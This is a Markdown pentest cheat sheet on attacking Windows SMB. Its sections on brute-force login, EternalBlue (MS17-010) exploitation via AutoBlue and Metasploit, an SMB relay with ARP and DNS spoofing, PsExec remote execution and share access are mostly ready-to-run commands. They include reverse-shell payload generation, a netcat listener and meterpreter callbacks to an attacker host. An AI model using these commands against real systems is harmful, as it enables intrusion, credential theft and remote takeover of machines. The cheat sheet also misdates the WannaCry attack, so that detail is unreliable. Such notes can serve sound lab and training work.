# SMB

# Explanation

- SMB (Server Message Block) : Network file sharing protocol that is used to facilitate the sharing of files
and peripherals between computers on a local network (LAN).

- SMB uses port TCP/445. However, originally, SMB ran on top of NetBIOS using port TCP/139.

- SAMBA is the open source linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

# SMB brute force attack

```
service postgresql start && msfconsole
msf6 > use auxiliary/scanner/smb/smb_login
msf6 > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf6 > set RHOSTS 10.2.24.221
msf6 > set VERBOSE false
msf6 > run
```

```
hydra -L admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 smb
```

# Exploiting MS17-010 - CVE-2017-0144 EternalBlue

## Description

- EternalBlue is the name given to a collection of Windows vulnerabilities and exploits that allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.

- The EternalBlue exploit was developed by the NSA (National Security Agency) to take advantage of the MS-17-010 vulnerability and was leaked to the public by a hacker group called by Shadow Brokers in 2017.

- The EternalBlue exploit takes advantage of vulnerability in the Windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands.

- The EternalBlue exploit was used in the WannaCry ransomware attack on June 27, 2017 to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible.

- This vulnerability affects multiple versions of Windows : 
    - Windows Vista
    - Windows 7
    - Windows Server 2008
    - Windows 8.1
    - Windows Server 2012
    - Windows 10
    - Windows Server 2016

- Microsoft released a patch for the vulnerability in March, 2017, however, many users and companies have still not yet patched their systems.

## Exploit MS17-010 with SMB (target : Windows Server 2008 R2)

### Scenario 1

Download and execute shell_prep : 
```
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010/shellcode
chmod u+x shell_prep.sh
./shell_prep.sh
```

Generate tcp meterpreter reverse shell : 
```
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y)
LHOST for reverse connection :
10.10.10.10
LPORT you want x64 to listen on:
1234
LPORT you want x86 to listen on:
1234
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
```

Start listener : 
```
nc -nvlp 1234
```

Exploiting with main python script (Windows Server 2008 R2 Standard) : 
```
cd ..
chmod u+x eternalblue_exploit7.py
python eternalblue_exploit7.py 10.10.10.12 shellcode/sc_x64.bin 
```
### Scenario 2

Use metasploit framework : 
```
msfconsole
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.12
msf6 > exploit
```

# SMB & DNS Relay Attack

An SMB relay attack is a type of network attack where an attacker intercepts SMB (Server Message Block) traffic, manipulates it, and relays it to legitimate server to gain unauthorized access to resources or perform malicious action.

This type of attack is common in Windows networks, where SMB is used for file sharing, printer sharing, and other network services.

## 1. Start msfconsole and configure the SMB Relay exploit

```
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST <attacker-ip
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set SMBHOST <victim-ip>
exploit
```

## 2. Configure dnsspoof

to redirect the victim to our Metasploit system every time there's an SMB connection to any host in the domain sportsfoo.com.

```
echo "<attacker-ip> *.sportsfoo.com" > dns
dnsspoof -i eth1 -f dns
```

## 3. Activate the MiTM attack using the ARP Spoofing technique

Our goal is to poison the traffic between our victim, Windows 7, and the default gateway. In this way, we can manipulate the traffic using
dnsspoof, which is already running. In order to perform an ARP Spoofing attack, we need to enable the IP forwarding as follow:

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

In two separate terminals, start the ARP Spoof attack against Windows 7 client and gateway using these commands:
```
arpspoof -i eth1 -t <win7-client-ip> <gateway-ip>
arpspoof -i eth1 -t <gateway-ip> <win7-client-ip>
```

## 4. Interact with the meterpreter session

```
sessions
sessions -i 1
getuid
```

# SMB connect with PsExec

PsExec is a lightweight telnet-replacement developed by Microsoft that allows you execute processes on remote windows systems using user's credentials.

```
psexec.py Administrator@10.2.24.221 cmd.exe

Password: <your_passwd>
```

```
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 10.2.24.221
msf6 > set SMBUser Administrator
msf6 > set SMBPass qwertyuiop
msf6 > run
```

# Mount and dismount a network drive on Windows

```
net use Z: \\<target>\C$ /user:username password
net use Z: /delete
net use * /delete
```

# Read SMB share on Linux attack machine

```
smbclient -N //<target>/public
smbclient -U admin //<target>/admin
```